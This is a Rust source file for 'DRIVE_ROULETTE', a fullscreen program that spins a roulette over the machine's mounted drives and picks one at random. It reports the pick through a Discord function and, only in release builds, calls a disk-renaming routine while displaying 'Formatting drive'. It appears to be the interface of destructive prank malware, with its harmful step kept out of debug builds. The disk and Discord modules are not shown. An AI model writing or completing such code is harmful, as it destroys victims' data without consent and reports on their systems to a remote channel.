use std::f32::consts::{FRAC_PI_3, PI};
use std::path::PathBuf;
use std::thread;

use macroquad::color::*;
use macroquad::prelude::*;
use macroquad::rand::ChooseRandom;
use macroquad::Window;
use tokio::runtime::Runtime;

use crate::{discord, disk};

const ANIM_TIME: f32 = 12.0;
const DEFAULT_SPEED: f32 = 7.0;

async fn render() {
    rand::srand(miniquad::date::now() as u64);

    let mut disks = generate_disks();
    disks.shuffle();


    let mut speed;
    let mut locked = false;

    let mut last_drive: PathBuf = PathBuf::from("C://");

    let last_c = ANIM_TIME * DEFAULT_SPEED;


    loop {
        let time = get_time();
        if time >= ANIM_TIME as f64 - 2.1 && !locked {
            locked = true;
            let last_drive_copy2 = last_drive.clone();
            let last_drive_copy = last_drive.clone();
            let rt = Runtime::new().unwrap();
            rt.block_on(async move {
                discord::send_disk_message(last_drive_copy2.to_str().unwrap().to_string()).await;
            });
            thread::spawn(move || { pick(last_drive_copy) });
        }
        speed = DEFAULT_SPEED + (ANIM_TIME - time as f32);

        clear_background(BLACK);
        if locked {
            draw_text(format!("Formatting drive {:?}...", last_drive.clone()).as_str(), 20.0, screen_height() - 20.0, 30.0, RED)
        }

        let center_x = screen_width() / 2.0;
        let center_y = screen_height() / 2.0;
        let radius = screen_width() / 5.0;

        draw_circle(center_x, center_y, radius, LIGHTGRAY);

        draw_text("DRIVE_ROULETTE", 20.0, 20.0, 30.0, DARKGRAY);

        let chamber_offset: f32 = radius / 1.8;
        let initial_x: f32 = center_x;
        let initial_y: f32 = center_y + chamber_offset;


        for i in 0..6 {
            let c: f32 = if !locked {
                FRAC_PI_3 * i as f32 + get_time() as f32 * speed
            } else {
                FRAC_PI_3 * (i + 1) as f32 + last_c.floor() + (FRAC_PI_3 - last_c)
            };

            let rotation_x = c.cos() * (initial_x - center_x) - c.sin() * (initial_y - center_y) + center_x;
            let rotation_y = c.sin() * (initial_x - center_x) - c.cos() * (initial_y - center_y) + center_y;
            let c_pi = c % (PI * 2.0);
            if (5.7..6.3).contains(&c_pi) || (0.05..0.2).contains(&c_pi)
            {
                draw_circle(rotation_x, rotation_y, radius / 4.0, YELLOW);
                last_drive = disks.get(i).unwrap().to_path_buf();
                draw_text(disks.get(i).unwrap().to_str().unwrap(), rotation_x - 30.0, rotation_y + 15.0, 50.0, ORANGE);
            } else {
                draw_circle(rotation_x, rotation_y, radius / 4.0, GRAY);
                draw_text(disks.get(i).expect("disk error").to_str().unwrap(), rotation_x - 30.0, rotation_y + 15.0, 50.0, DARKGRAY);
            }
        }


        next_frame().await
    }
}

fn pick(picked_disk: PathBuf) {
    #[cfg(debug_assertions)]
    println!("Picked disk {:?}", picked_disk);

    #[cfg(not(debug_assertions))]
    disk::start_rename(picked_disk, true);
}


fn generate_disks() -> Vec<PathBuf> {
    let drives = disk::get_mount_points();
    println!("{:?}", drives);
    let mut new_drives: Vec<PathBuf> = Default::default();
    println!("{:?}", new_drives);

    if drives.len() < 6 {
        let mut j;
        for i in 0..6 {
            j = i % drives.len();
            new_drives.push(drives.get(j).unwrap().to_path_buf())
        }
    } else {
        return drives;
    }
    new_drives
}

pub(crate) fn start_ui() {
    thread::spawn(|| {
        Window::from_config(
            window_conf(),
            render(),
        );
    }).join().unwrap();
}

fn window_conf() -> Conf {
    Conf {
        window_title: "DRIVE_ROULETTE".to_owned(),
        window_width: 1920,
        window_height: 1080,
        high_dpi: false,
        fullscreen: true,
        sample_count: 0,
        window_resizable: false,
        icon: None,
        platform: Default::default(),
    }
}
